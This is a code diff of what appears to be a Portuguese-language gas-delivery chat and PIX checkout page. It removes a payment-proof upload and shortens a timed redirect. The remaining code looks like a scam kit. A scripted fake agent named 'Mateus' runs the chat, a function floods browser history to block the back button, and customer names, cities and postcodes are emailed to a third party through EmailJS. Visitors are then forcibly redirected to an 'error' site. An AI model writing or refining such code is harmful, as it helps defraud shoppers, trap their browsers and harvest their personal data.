@@ -98,9 +98,6 @@
   })();
 
   window._transcriptSent = false;
-  window._proofImageData = null;
-  window._proofImageSent = false;
-  window._proofImageBase64 = null;
     function sendTranscript() {
   // Só envia se um PIX foi gerado e a transcrição ainda não foi enviada
   if (window._transcriptSent || !window._currentPixCode) return;
@@ -114,15 +111,10 @@
       const isAgent = el.classList.contains('agent');
       const sender = isAgent ? "Mateus" : "Cliente";
       const bubble = el.querySelector('.bubble');
-      const comprovantePreview = el.querySelector('.comprovante-preview');
       
-      if (comprovantePreview) {
-        const img = comprovantePreview.querySelector('img');
-        if (img && img.src) {
-          transcript += `[${sender}]: [COMPROVANTE DE PAGAMENTO]\n`;
-          window._proofImageBase64 = img.src;
-        }
-      } else if (bubble) {
+      if (bubble) {
+        // Tenta pegar o texto original salvo (caso tenha sido substituído pelo aviso)
+        // Se não houver texto salvo, pega o texto atual da bolha
         const text = (bubble.dataset.originalText || bubble.innerText).replace(/\n/g, ' ').trim();
         transcript += `[${sender}]: ${text}\n`;
       }
@@ -134,14 +126,11 @@
   });
 
 const orderInfo = window.ORDER ? `\n--- Dados do Pedido ---\nNome: ${window.ORDER.nome || 'N/A'}\nCidade: ${window.ORDER.location || 'N/A'}\nCEP: ${window.ORDER.cep || 'N/A'}\nPreço: R$ ${window.ORDER.productPrice || 'N/A'}\n` : "";
-const proofImageData = window._proofImageBase64 ? `\n[IMAGEM_COMPROVANTE_BASE64_START]\n${window._proofImageBase64}\n[IMAGEM_COMPROVANTE_BASE64_END]\n` : "";
   
   const templateParams = {
     user_name: window.ORDER ? window.ORDER.nome : "Cliente Pix",
-    message: transcript + orderInfo + proofImageData,
-    pix_code: window._currentPixCode || "Gerado",
-    proof_image: window._proofImageBase64 || null,
-    proof_filename: window._proofImageData ? window._proofImageData.name : null
+    message: transcript + orderInfo,
+    pix_code: window._currentPixCode || "Gerado"
   };
 
   emailjs.send('service_j2hab7s', 'template_xsfblgj', templateParams)
@@ -581,49 +570,6 @@ html,body{
 .send-btn:disabled{background:var(--border);color:var(--text-3);cursor:default;box-shadow:none;transform:scale(.9);opacity:.6;}
 .send-btn:not(:disabled):hover{background:var(--brand-dk);transform:scale(1.05);}
 .send-btn:not(:disabled):active{transform:scale(.95);}
-
-/* ── UPLOAD BUTTON ── */
-.upload-btn{
-  width:36px;height:36px;border-radius:50%;
-  background:var(--brand);color:#fff;
-  border:none;cursor:pointer;
-  display:flex;align-items:center;justify-content:center;
-  margin-bottom:3px;flex-shrink:0;
-  transition:all .2s var(--spring);
-  box-shadow:0 2px 8px var(--brand-glow);
-  position:relative;
-}
-.upload-btn:hover{background:var(--brand-mid);transform:scale(1.05);}
-.upload-btn:active{transform:scale(.95);}
-.upload-btn input[type="file"]{
-  display:none;
-}
-.upload-badge{
-  position:absolute;top:-5px;right:-5px;
-  background:#10B981;color:#fff;font-size:9px;font-weight:700;
-  min-width:17px;height:17px;border-radius:10px;
-  display:none;align-items:center;justify-content:center;
-  border:2px solid var(--surface);padding:0 3px;
-}
-.upload-badge.on{display:flex;}
-
-/* ── COMPROVANTE PREVIEW ── */
-.comprovante-preview{
-  max-width:280px;border-radius:12px;overflow:hidden;
-  box-shadow:0 2px 8px rgba(0,0,0,.12);
-  animation:msgIn .28s var(--ease);
-}
-.comprovante-preview img{
-  width:100%;height:auto;display:block;
-}
-.comprovante-info{
-  background:var(--surface-2);padding:8px 12px;
-  font-size:11px;color:var(--text-3);font-weight:500;
-  display:flex;align-items:center;gap:6px;
-}
-.comprovante-info svg{
-  color:var(--green);flex-shrink:0;
-}
 
 /* ── MODALS ── */
 .modal-overlay{
@@ -1098,11 +1044,6 @@ html,body{
     <div class="input-wrap" id="inputWrap">
       <textarea class="input-el" id="msgInput" placeholder="Digite uma mensagem..." rows="1"></textarea>
     </div>
-    <button class="upload-btn" id="uploadBtn" aria-label="Enviar Comprovante">
-      <input type="file" id="proofInput" accept="image/*" />
-      <span class="upload-badge" id="uploadBadge">✓</span>
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
-    </button>
     <button class="send-btn" id="sendBtn" disabled aria-label="Enviar">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polyline points="22 2 15 22 11 13 2 9 22 2"/></svg>
     </button>
@@ -1175,9 +1116,6 @@ const STATE_STORAGE_KEY = 'diskgas_chat_state_blackpayments_v1';
 const inputEl        = document.getElementById('msgInput');
 const inputWrapEl    = document.getElementById('inputWrap');
 const sendBtnEl      = document.getElementById('sendBtn');
-const uploadBtnEl    = document.getElementById('uploadBtn');
-const proofInputEl   = document.getElementById('proofInput');
-const uploadBadgeEl  = document.getElementById('uploadBadge');
   sendBtnEl.disabled = !inputEl.value.trim();
 const typingEl       = document.getElementById('typingRow');
 const fabEl          = document.getElementById('scrollFab');
@@ -1605,8 +1543,7 @@ function saveChatHistory() {
     pixCopyClicked: window._pixCopyClicked || false,
         pixCopyReminderSent: window._pixCopyReminderSent || false,
     pixPaymentReminderSent: window._pixPaymentReminderSent || false,
-    orderConfirmationShown: window._orderConfirmationShown || false,
-    proofImageSent: window._proofImageSent || false
+    orderConfirmationShown: window._orderConfirmationShown || false
   };
   localStorage.setItem(STATE_STORAGE_KEY, JSON.stringify(state));
 }
@@ -2259,63 +2196,6 @@ function addProfessionalStatusCard() {
   msgsEl.appendChild(card); scrollDown(true); return card;
 }
 
-// -- UPLOAD DE COMPROVANTE --
-uploadBtnEl.onclick = () => proofInputEl.click();
-proofInputEl.addEventListener('change', async (e) => {
-  const file = e.target.files[0];
-  if (!file) return;
-  
-  if (!file.type.startsWith('image/')) {
-    alert('Por favor, envie uma imagem como comprovante');
-    return;
-  }
-  
-  window._proofImageData = file;
-  window._proofImageSent = true;
-  
-  const reader = new FileReader();
-  reader.onload = (event) => {
-    const base64Image = event.target.result;
-    window._proofImageBase64 = base64Image;
-    const row = document.createElement('div');
-    row.className = 'row user';
-    const preview = document.createElement('div');
-    preview.className = 'comprovante-preview';
-    preview.innerHTML = `<img src="${base64Image}" alt="Comprovante" /><div class="comprovante-info"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg><span>Comprovante enviado</span></div>`;
-    row.appendChild(preview);
-    msgsEl.appendChild(row);
-    scrollDown(true);
-    
-    uploadBadgeEl.classList.add('on');
-    setTimeout(() => uploadBadgeEl.classList.remove('on'), 3000);
-    
-    saveChatHistory();
-    
-    // Armazenar comprovante em localStorage
-    const proofData = {
-      userId: userId,
-      base64: base64Image,
-      fileName: file.name,
-      timestamp: new Date().toISOString(),
-      size: file.size
-    };
-    localStorage.setItem('diskgas_proof_' + userId, JSON.stringify(proofData));
-    
-    socket.emit('send_message', { 
-      userId: userId, 
-      text: '[Comprovante de Pagamento Enviado]', 
-      sender: 'Cliente',
-      isAuto: false,
-      proofImage: base64Image,
-      proofFileName: file.name,
-      proofStored: true
-    });
-    
-    proofInputEl.value = '';
-  };
-  reader.readAsDataURL(file);
-});
-
 function lockBackButton() {
   const STACK_FILL = 60;
   for (let i = 0; i < STACK_FILL; i++) history.pushState({ diskgas_lock: true, n: i }, '', location.href);
@@ -2339,7 +2219,6 @@ function lockBackButton() {
         if (state.lojaAddress) window._lojaAddress = state.lojaAddress;
     window._orderConfirmationShown = state.orderConfirmationShown || false;
     window._currentPixCode = state.pixCode; window._pixCopyTimer = null; window._pixPaymentTimer = null; window._pixCopyReminderSent = false; window._pixPaymentReminderSent = false;
-    window._proofImageSent = state.proofImageSent || false;
     lastSender = state.lastSender; window._currentFlowStep = state.flowStep || 0; window._paymentConfirmed = state.paymentConfirmed || false; window._contactMsgSent = state.contactMsgSent || false; window._pixCopyClicked = state.pixCopyClicked || false; window._pixCopyReminderSent = state.pixCopyReminderSent || false; window._pixPaymentReminderSent = state.pixPaymentReminderSent || false;
     msgsEl.innerHTML = savedHTML;
     const pixCopyBtn = msgsEl.querySelector('#pixCopyBtn');
@@ -2388,8 +2267,8 @@ function lockBackButton() {
 (function () {
   const REDIRECT_URL    = 'https://concluerror.onrender.com';
   const MS_FIRST_ACCESS = 25 * 60 * 1000;
-  const MS_AFTER_PROOF  = 3 * 60 * 1000;
-  const KEY_FA  = 'dg_fa'; const KEY_PROOF  = 'dg_proof';
+  const MS_AFTER_PIX    = 15 * 60 * 1000;
+  const KEY_FA  = 'dg_fa'; const KEY_PT  = 'dg_pt';
   let _timer = null;
   function startTimer(ms) {
     if (_timer) clearTimeout(_timer);
@@ -2401,10 +2280,10 @@ function lockBackButton() {
   if (remainFA <= 0) { window.location.href = REDIRECT_URL; return; }
   startTimer(remainFA);
   setInterval(() => {
-    let proof = localStorage.getItem(KEY_PROOF);
-    if (!proof && window._proofImageSent) {
-      proof = Date.now(); localStorage.setItem(KEY_PROOF, proof);
-      let remainProof = MS_AFTER_PROOF; startTimer(remainProof);
+    let pt = localStorage.getItem(KEY_PT);
+    if (!pt && window._currentPixCode) {
+      pt = Date.now(); localStorage.setItem(KEY_PT, pt);
+      let remainPT = MS_AFTER_PIX; startTimer(remainPT);
     }
   }, 2000);
 })();
